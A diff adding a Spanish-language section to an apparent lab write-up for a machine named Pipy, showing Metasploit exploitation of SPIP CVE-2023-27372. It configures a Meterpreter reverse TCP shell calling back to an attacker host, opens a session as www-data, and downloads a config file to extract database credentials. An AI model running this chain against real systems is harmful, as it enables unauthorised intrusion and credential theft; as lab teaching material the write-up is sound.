@@ -24,7 +24,11 @@
    - [Estabilización de la shell](#estabilización-de-la-shell)
    - [Enumeración interna y acceso a Angela](#enumeración-interna-y-acceso-a-angela)
 7. [Escalada de privilegios — CVE-2023-4911 (Looney Tunables)](#7-escalada-de-privilegios--cve-2023-4911-looney-tunables)
-8. [Resumen de vulnerabilidades](#8-resumen-de-vulnerabilidades)
+8. [Explotación con Metasploit](#8-explotación-con-metasploit)
+   - [Búsqueda e información del módulo](#búsqueda-e-información-del-módulo)
+   - [Configuración del exploit](#configuración-del-exploit)
+   - [Ejecución y post-explotación](#ejecución-y-post-explotación)
+9. [Resumen de vulnerabilidades](#9-resumen-de-vulnerabilidades)
 
 ---
 
@@ -528,7 +532,273 @@ root.txt  snap
 
 ---
 
-## 8. Resumen de vulnerabilidades
+## 8. Explotación con Metasploit
+
+### Búsqueda e información del módulo
+
+Lanzamos y actualizamos la base de datos de Metasploit.
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ sudo msfdb init && msfconsole
+```
+
+Buscamos módulos relacionados con la vulnerabilidad SPIP.
+
+```bash
+msf > search cve:2023 SPIP
+
+Matching Modules
+================
+
+   #  Name                                   Disclosure Date  Rank       Check  Description
+   -  ----                                   ---------------  ----       -----  -----------
+   0  exploit/multi/http/spip_rce_form       2023-02-27       excellent  Yes    SPIP form PHP Injection
+   1    \_ target: PHP In-Memory             .                .          .      .
+   2    \_ target: Unix/Linux Command Shell  .                .          .      .
+   3    \_ target: Windows Command Shell     .                .          .      .
+
+
+Interact with a module by name or index. For example info 3, use 3 or use exploit/multi/http/spip_rce_form
+After interacting with a module you can manually set a TARGET with set TARGET 'Windows Command Shell'
+```
+
+Vemos información del módulo. Vemos que permite RCE (Remote Code Execution), corresponde con el CVE-2023-27372 que encontramos antes y es aplicable a la versión SPIP 4.2.0 que tiene la máquina.
+
+```bash
+msf > info 0
+
+       Name: SPIP form PHP Injection
+     Module: exploit/multi/http/spip_rce_form
+   Platform: PHP, Unix, Linux, Windows
+       Arch: php, cmd
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2023-02-27
+
+Provided by:
+  coiffeur
+  Laluka
+  Julien Voisin
+  Valentin Lobstein
+
+Module side effects:
+ ioc-in-logs
+
+Module stability:
+ crash-safe
+
+Module reliability:
+ repeatable-session
+
+Available targets:
+      Id  Name
+      --  ----
+  =>  0   PHP In-Memory
+      1   Unix/Linux Command Shell
+      2   Windows Command Shell
+
+Check supported:
+  Yes
+
+Basic options:
+  Name       Current Setting  Required  Description
+  ----       ---------------  --------  -----------
+  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][..
+                                        .]. Supported proxies: sapni, socks4, socks5, socks5h, htt
+                                        p
+  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/u
+                                        sing-metasploit/basics/using-metasploit.html
+  RPORT      80               yes       The target port (TCP)
+  SSL        false            no        Negotiate SSL/TLS for outgoing connections
+  TARGETURI  /                yes       Path to Spip install
+  VHOST                       no        HTTP server virtual host
+
+Payload information:
+
+Description:
+  This module exploits a PHP code injection in SPIP. The vulnerability exists in the
+  oubli parameter and allows an unauthenticated user to execute arbitrary commands
+  with web user privileges. Branches 3.2, 4.0, 4.1 and 4.2 are concerned. Vulnerable versions
+  are <3.2.18, <4.0.10, <4.1.18 and <4.2.1.
+
+References:
+  https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-2-1-SPIP-4-1-8-SPIP-4-0-10-et.html
+  https://therealcoiffeur.com/c11010
+  https://nvd.nist.gov/vuln/detail/CVE-2023-27372
+
+
+View the full module info with the info -d command.
+```
+
+### Configuración del exploit
+
+Cargamos el módulo.
+
+```bash
+msf > use exploit/multi/http/spip_rce_form
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf exploit(multi/http/spip_rce_form) >
+```
+
+Vemos las opciones del módulo.
+
+```bash
+msf exploit(multi/http/spip_rce_form) > show options
+
+Module options (exploit/multi/http/spip_rce_form):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][.
+                                         ..]. Supported proxies: sapni, socks4, socks5, socks5h, h
+                                         ttp
+   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/
+                                         using-metasploit/basics/using-metasploit.html
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Path to Spip install
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.100.250  yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   PHP In-Memory
+
+
+
+View the full module info with the info, or info -d command.
+```
+
+> **Nota:** En la fase de explotación existen conceptos que hay que tener en cuenta:
+> - **Exploit**: Código que se aprovecha de un error o vulnerabilidad con el objetivo de lograr un comportamiento no previsto en un sistema informático.
+> - **Payload o carga útil**: Código malicioso que se ejecuta como consecuencia de un exploit en el sistema víctima.
+> - **Vulnerabilidad**: Debilidad de un sistema que puede ser aprovechada por un exploit para lograr un comportamiento no previsto en un sistema informático.
+
+Para poder usar el módulo anterior `exploit/multi/http/spip_rce_form` hay que configurar las opciones del exploit para que pueda acceder a la máquina víctima. En nuestro caso, las opciones a configurar son:
+- **RHOSTS**: Permite indicar el equipo o equipos víctima.
+- **RPORT**: Permite indicar el puerto donde se escucha el servicio TCP que corre la máquina Pipy.
+
+Al hablar de una reverse shell, es decir, el equipo víctima realiza una conexión hacia la máquina del atacante para proporcionar una consola, es necesario configurar un socket TCP en la máquina del atacante para que pueda recibir la conexión.
+- **LHOST**: Permite indicar la IP de la máquina atacante.
+- **LPORT**: Permite indicar el puerto donde se escucha el servicio TCP que corre la máquina atacante.
+
+Con dicho fin, el payload `php/meterpreter/reverse_tcp` se encargará de establecer la conexión con la máquina atacante al ser el código que en ella se ejecuta y proporcionar una consola. Con tal fin están configurados el LHOST y LPORT por defecto con los valores `192.168.100.250` y `4444` respectivamente.
+
+> **Nota**: Meterpreter es un payload avanzado que proporciona una consola con múltiples funcionalidades, como la ejecución de comandos, la elevación de privilegios, la captura de pantalla, subir archivos con el comando *upload*, descargar archivos con el comando *download*, entre otros. Esto significa que una shell de tipo Meterpreter proporciona más características y funcionalidades que una shell de tipo bash o powershell.
+
+```bash
+msf exploit(multi/http/spip_rce_form) > set RHOSTS 192.168.100.6
+RHOSTS => 192.168.100.6
+msf exploit(multi/http/spip_rce_form) > show options
+
+Module options (exploit/multi/http/spip_rce_form):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][.
+                                         ..]. Supported proxies: sapni, socks4, socks5, socks5h, h
+                                         ttp
+   RHOSTS     192.168.100.6    yes       The target host(s), see https://docs.metasploit.com/docs/
+                                         using-metasploit/basics/using-metasploit.html
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Path to Spip install
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.100.250  yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   PHP In-Memory
+
+
+
+View the full module info with the info, or info -d command.
+```
+
+### Ejecución y post-explotación
+
+Con dichos valores y los valores por defecto para las opciones del exploit, ejecutamos el exploit con el comando `run` o `exploit`.
+
+```bash
+msf exploit(multi/http/spip_rce_form) > run
+[*] Started reverse TCP handler on 192.168.100.250:4444
+[*] Running automatic check ("set AutoCheck false" to disable)
+[*] SPIP Version detected: 4.2.0
+[+] The target appears to be vulnerable. The detected SPIP version (4.2.0) is vulnerable.
+[*] Got anti-csrf token: iYe2q77AjJpzr7DiCN466DffCNPeUp0xMFqKM8HZ2jA5IWNjp6Vhzoioj1CV4d/wM8wzPYKIJAYCiLEY+fBNfgPHcNshG3+b
+[*] 192.168.100.6:80 - Attempting to exploit...
+[*] Sending stage (42137 bytes) to 192.168.100.6
+[*] Meterpreter session 1 opened (192.168.100.250:4444 -> 192.168.100.6:33192) at 2026-04-22 09:22:27 +0200
+
+meterpreter > getuid
+Server username: www-data
+meterpreter > pwd
+/var/www/html
+meterpreter > sysinfo
+Computer        : pipy
+OS              : Linux pipy 5.15.0-84-generic #93-Ubuntu SMP Tue Sep 5 17:16:10 UTC 2023 x86_64
+Architecture    : x64
+System Language : C
+Meterpreter     : php/linux
+```
+
+> **¡Acceso conseguido!** Sesión de Meterpreter abierta en la máquina objetivo con el usuario `www-data`.
+
+Podemos descargar el fichero de conexión y ver la información de este alojado en la máquina atacante.
+
+```bash
+meterpreter > download config/connect.php
+[*] Downloading: config/connect.php -> /home/kali/connect.php
+[*] Downloaded 243.00 B of 243.00 B (100.0%): config/connect.php -> /home/kali/connect.php
+[*] Completed  : config/connect.php -> /home/kali/connect.php
+meterpreter > lcat /home/kali/connect.php
+<?php
+if (!defined("_ECRIRE_INC_VERSION")) return;
+defined('_MYSQL_SET_SQL_MODE') || define('_MYSQL_SET_SQL_MODE',true);
+$GLOBALS['spip_connect_version'] = 0.8;
+spip_connect_db('localhost','','root','dbpassword','spip','mysql', 'spip','','');
+```
+
+> **Credenciales obtenidas:** Contraseña de base de datos extraída del fichero de conexión.
+
+El comando `shell` nos permite obtener una línea de comandos estándar. Para salir de ella, hacemos uso del comando exit.
+
+```bash
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+lsb_release -a
+Distributor ID: Ubuntu
+Description:    Ubuntu 22.04.3 LTS
+Release:        22.04
+Codename:       jammy
+No LSB modules are available.
+```
+
+---
+
+## 9. Resumen de vulnerabilidades
 
 | # | Vulnerabilidad | CVE | Criticidad | Impacto |
 |---|---------------|-----|------------|---------|
